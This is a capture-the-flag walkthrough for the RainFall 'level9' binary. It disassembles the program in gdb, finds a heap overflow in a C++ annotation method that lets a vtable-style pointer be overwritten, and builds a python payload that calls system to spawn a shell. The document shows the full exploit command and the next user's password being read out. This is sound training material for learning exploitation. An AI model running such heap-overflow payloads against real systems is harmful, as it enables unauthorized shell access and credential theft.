# Level9

```bash
(gdb) disas main
Dump of assembler code for function main:
   0x080485f4 <+0>:	push   ebp
   0x080485f5 <+1>:	mov    ebp,esp
   0x080485f7 <+3>:	push   ebx
   0x080485f8 <+4>:	and    esp,0xfffffff0
   0x080485fb <+7>:	sub    esp,0x20
   0x080485fe <+10>:	cmp    DWORD PTR [ebp+0x8],0x1    // compares argc with 1
   0x08048602 <+14>:	jg     0x8048610 <main+28>        // if argc > 1 continues the program
   0x08048604 <+16>:	mov    DWORD PTR [esp],0x1        // exit code set to 1
   0x0804860b <+23>:	call   0x80484f0 <_exit@plt>      // exits for argc <= 1
   0x08048610 <+28>:	mov    DWORD PTR [esp],0x6c       // place 108 on top of stack
   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>      // operator new
   0x0804861c <+40>:	mov    ebx,eax
   0x0804861e <+42>:	mov    DWORD PTR [esp+0x4],0x5
   0x08048626 <+50>:	mov    DWORD PTR [esp],ebx
   0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>      // N::N(5)
   0x0804862e <+58>:	mov    DWORD PTR [esp+0x1c],ebx
   0x08048632 <+62>:	mov    DWORD PTR [esp],0x6c
   0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
   0x0804863e <+74>:	mov    ebx,eax
   0x08048640 <+76>:	mov    DWORD PTR [esp+0x4],0x6
   0x08048648 <+84>:	mov    DWORD PTR [esp],ebx
   0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>
   0x08048650 <+92>:	mov    DWORD PTR [esp+0x18],ebx
   0x08048654 <+96>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048658 <+100>:	mov    DWORD PTR [esp+0x14],eax
   0x0804865c <+104>:	mov    eax,DWORD PTR [esp+0x18]
   0x08048660 <+108>:	mov    DWORD PTR [esp+0x10],eax
   0x08048664 <+112>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048667 <+115>:	add    eax,0x4
   0x0804866a <+118>:	mov    eax,DWORD PTR [eax]
   0x0804866c <+120>:	mov    DWORD PTR [esp+0x4],eax
   0x08048670 <+124>:	mov    eax,DWORD PTR [esp+0x14]
   0x08048674 <+128>:	mov    DWORD PTR [esp],eax
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]
   0x08048680 <+140>:	mov    eax,DWORD PTR [eax]
   0x08048682 <+142>:	mov    edx,DWORD PTR [eax]
   0x08048684 <+144>:	mov    eax,DWORD PTR [esp+0x14]
   0x08048688 <+148>:	mov    DWORD PTR [esp+0x4],eax
   0x0804868c <+152>:	mov    eax,DWORD PTR [esp+0x10]
   0x08048690 <+156>:	mov    DWORD PTR [esp],eax
   0x08048693 <+159>:	call   edx
   0x08048695 <+161>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x08048698 <+164>:	leave  
   0x08048699 <+165>:	ret    
End of assembler dump.
```

When entering the function `<_ZN1NC2Ei>` with the gdb instruction `si` , the debugger displayes :

```bash
(gdb) si
0x080486f6 in N::N(int) ()
```

Which means there is a class N with methods.

```bash
(gdb) disas _ZN1NC2Ei
Dump of assembler code for function _ZN1NC2Ei:
   0x080486f6 <+0>:	push   ebp
   0x080486f7 <+1>:	mov    ebp,esp
   0x080486f9 <+3>:	mov    eax,DWORD PTR [ebp+0x8]
   0x080486fc <+6>:	mov    DWORD PTR [eax],0x8048848
   0x08048702 <+12>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048705 <+15>:	mov    edx,DWORD PTR [ebp+0xc]
   0x08048708 <+18>:	mov    DWORD PTR [eax+0x68],edx
   0x0804870b <+21>:	pop    ebp
   0x0804870c <+22>:	ret    
End of assembler dump.
```

```bash
(gdb) disas _ZN1N13setAnnotationEPc
Dump of assembler code for function _ZN1N13setAnnotationEPc:
   0x0804870e <+0>:	push   ebp
   0x0804870f <+1>:	mov    ebp,esp
   0x08048711 <+3>:	sub    esp,0x18
   0x08048714 <+6>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048717 <+9>:	mov    DWORD PTR [esp],eax
   0x0804871a <+12>:	call   0x8048520 <strlen@plt>
   0x0804871f <+17>:	mov    edx,DWORD PTR [ebp+0x8]
   0x08048722 <+20>:	add    edx,0x4
   0x08048725 <+23>:	mov    DWORD PTR [esp+0x8],eax
   0x08048729 <+27>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804872c <+30>:	mov    DWORD PTR [esp+0x4],eax
   0x08048730 <+34>:	mov    DWORD PTR [esp],edx
   0x08048733 <+37>:	call   0x8048510 <memcpy@plt>
   0x08048738 <+42>:	leave
   0x08048739 <+43>:	ret
End of assembler dump.
```

```bash
(gdb) b *0x08048677
Breakpoint 1 at 0x8048677
(gdb) r 3
Starting program: /home/user/level9/level9 3

Breakpoint 1, 0x08048677 in main ()
(gdb) si
0x0804870e in N::setAnnotation(char*) ()
```

The function `memcpy` is called inside of `setAnnotation`  and new buffer is then placed in `edx` and called in main.

```bash
   // main
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
   [...]
   0x08048682 <+142>:	mov    edx,DWORD PTR [eax] // dest buffer
   [...]
   0x08048693 <+159>:	call   edx
```

We will try to write a shellcode that executes `system("/bin/sh")` .

```bash
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7d86060 <system>
```

A size of 108 was allocated which indicates us the position for our argument.

So the shellcode will look like :

1. `system` address
2. random characters until the end of 108 size buffer
3. return address of memcpy (the address of dest buffer)
4. parameter

```bash
(gdb) b *0x08048733   // the function call setAnnotation
Breakpoint 1 at 0x8048733
(gdb) r 4
Starting program: /home/user/level9/level9 4

Breakpoint 1, 0x08048733 in N::setAnnotation(char*) ()
(gdb) x/a $esp
0xbffff600:	0x804a00c
```

In hex, `"/bin/sh"` → `"\x2f\x62\x69\x6e\x2f\x73\x68"`

```bash
level9@RainFall:~$ ./level9 $(python -c 'print("\x60\x60\xd8\xb7" + "A" * 104 + "\x0c\xa0\x04\x08" + "\x2f\x62\x69\x6e\x2f\x73\x68")')
sh: 1: 
       /bin/sh: Permission denied
```

But we can note that :

In summary, the semicolon ensures proper command separation and execution. Without it, the shell might misinterpret the payload, leading to errors like "Permission denied."

Instead we can try to use `";\x2f\x62\x69\x6e\x2f\x73\x68"`  for "/bin/sh"

```bash
level9@RainFall:~$ ./level9 $(python -c 'print("\x60\x60\xd8\xb7" + "A" * 104 + "\x0c\xa0\x04\x08" + ";\x2f\x62\x69\x6e\x2f\x73\x68")')
sh: 1: 
       : not found
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```